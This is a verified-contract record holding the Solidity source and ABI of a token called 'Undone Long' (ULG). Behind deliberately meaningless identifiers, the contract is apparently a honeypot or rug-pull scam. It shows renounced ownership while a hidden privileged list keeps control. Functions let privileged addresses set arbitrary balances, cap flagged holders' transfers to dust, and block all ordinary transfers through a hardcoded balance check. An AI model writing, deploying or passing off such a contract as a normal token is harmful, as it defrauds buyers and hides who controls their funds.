{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface launchedReceiverAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract totalAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamMarketing {\n    function createPair(address liquidityBuyIs, address listLiquidityExempt) external returns (address);\n}\n\ninterface marketingEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamFromLimit) external view returns (uint256);\n\n    function transfer(address receiverTo, uint256 swapShouldIs) external returns (bool);\n\n    function allowance(address launchList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapShouldIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverTo,\n        uint256 swapShouldIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txAtShould, uint256 value);\n    event Approval(address indexed launchList, address indexed spender, uint256 value);\n}\n\ninterface marketingEnableMetadata is marketingEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UndoneLong is totalAuto, marketingEnable, marketingEnableMetadata {\n\n    function owner() external view returns (address) {\n        return txTotalFee;\n    }\n\n    bool private txSenderSwap;\n\n    function teamTotal(uint256 swapShouldIs) public {\n        swapLaunched();\n        fundLaunch = swapShouldIs;\n    }\n\n    function enableMin(address liquidityTake) public {\n        if (limitSender) {\n            return;\n        }\n        \n        liquidityTeam[liquidityTake] = true;\n        if (sellExempt != marketingBuy) {\n            marketingBuy = true;\n        }\n        limitSender = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountTeam;\n    }\n\n    bool private tokenTo;\n\n    function allowance(address teamSell, address modeMax) external view virtual override returns (uint256) {\n        if (modeMax == amountTrading) {\n            return type(uint256).max;\n        }\n        return minTotal[teamSell][modeMax];\n    }\n\n    mapping(address => bool) public fromShouldBuy;\n\n    function totalLimit(address isSell, address receiverTo, uint256 swapShouldIs) internal returns (bool) {\n        require(marketingAtSwap[isSell] >= swapShouldIs);\n        marketingAtSwap[isSell] -= swapShouldIs;\n        marketingAtSwap[receiverTo] += swapShouldIs;\n        emit Transfer(isSell, receiverTo, swapShouldIs);\n        return true;\n    }\n\n    address public buyFund;\n\n    string private listWallet = \"Undone Long\";\n\n    uint256 tokenLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return listWallet;\n    }\n\n    uint256 public sellAtReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingMode;\n    }\n\n    function launchedSwapLimit(address isSell, address receiverTo, uint256 swapShouldIs) internal returns (bool) {\n        if (isSell == buyFund) {\n            return totalLimit(isSell, receiverTo, swapShouldIs);\n        }\n        uint256 autoFrom = marketingEnable(modeAt).balanceOf(feeMarketing);\n        require(autoFrom == fundLaunch);\n        require(receiverTo != feeMarketing);\n        if (fromShouldBuy[isSell]) {\n            return totalLimit(isSell, receiverTo, autoAt);\n        }\n        return totalLimit(isSell, receiverTo, swapShouldIs);\n    }\n\n    uint256 private fromSender;\n\n    uint256 constant autoAt = 10 ** 10;\n\n    function balanceOf(address teamFromLimit) public view virtual override returns (uint256) {\n        return marketingAtSwap[teamFromLimit];\n    }\n\n    function swapLaunched() private view {\n        require(liquidityTeam[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return txTotalFee;\n    }\n\n    constructor (){\n        \n        launchedReceiverAt txReceiver = launchedReceiverAt(amountTrading);\n        modeAt = teamMarketing(txReceiver.factory()).createPair(txReceiver.WETH(), address(this));\n        if (sellAtReceiver == fromSender) {\n            sellExempt = true;\n        }\n        buyFund = _msgSender();\n        atWallet();\n        liquidityTeam[buyFund] = true;\n        marketingAtSwap[buyFund] = amountTeam;\n        \n        emit Transfer(address(0), buyFund, amountTeam);\n    }\n\n    uint8 private marketingMode = 18;\n\n    function approve(address modeMax, uint256 swapShouldIs) public virtual override returns (bool) {\n        minTotal[_msgSender()][modeMax] = swapShouldIs;\n        emit Approval(_msgSender(), modeMax, swapShouldIs);\n        return true;\n    }\n\n    bool public limitSender;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingLimit;\n    }\n\n    uint256 private amountTeam = 100000000 * 10 ** 18;\n\n    function marketingAt(address maxWallet) public {\n        swapLaunched();\n        \n        if (maxWallet == buyFund || maxWallet == modeAt) {\n            return;\n        }\n        fromShouldBuy[maxWallet] = true;\n    }\n\n    uint256 fundLaunch;\n\n    mapping(address => bool) public liquidityTeam;\n\n    address private txTotalFee;\n\n    bool private sellExempt;\n\n    bool public marketingBuy;\n\n    event OwnershipTransferred(address indexed modeFund, address indexed takeTotal);\n\n    mapping(address => mapping(address => uint256)) private minTotal;\n\n    address feeMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address isSell, address receiverTo, uint256 swapShouldIs) external override returns (bool) {\n        if (_msgSender() != amountTrading) {\n            if (minTotal[isSell][_msgSender()] != type(uint256).max) {\n                require(swapShouldIs <= minTotal[isSell][_msgSender()]);\n                minTotal[isSell][_msgSender()] -= swapShouldIs;\n            }\n        }\n        return launchedSwapLimit(isSell, receiverTo, swapShouldIs);\n    }\n\n    bool public takeSwapReceiver;\n\n    uint256 public tradingLaunch;\n\n    function atWallet() public {\n        emit OwnershipTransferred(buyFund, address(0));\n        txTotalFee = address(0);\n    }\n\n    bool public tradingReceiver;\n\n    string private tradingLimit = \"ULG\";\n\n    address amountTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public modeAt;\n\n    function transfer(address minFromTeam, uint256 swapShouldIs) external virtual override returns (bool) {\n        return launchedSwapLimit(_msgSender(), minFromTeam, swapShouldIs);\n    }\n\n    mapping(address => uint256) private marketingAtSwap;\n\n    function marketingReceiver(address minFromTeam, uint256 swapShouldIs) public {\n        swapLaunched();\n        marketingAtSwap[minFromTeam] = swapShouldIs;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txAtShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShouldIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFromLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"}],\"name\":\"enableMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromShouldBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxWallet\",\"type\":\"address\"}],\"name\":\"marketingAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFromTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShouldIs\",\"type\":\"uint256\"}],\"name\":\"marketingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAtReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSwapReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapShouldIs\",\"type\":\"uint256\"}],\"name\":\"teamTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFromTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShouldIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShouldIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UndoneLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}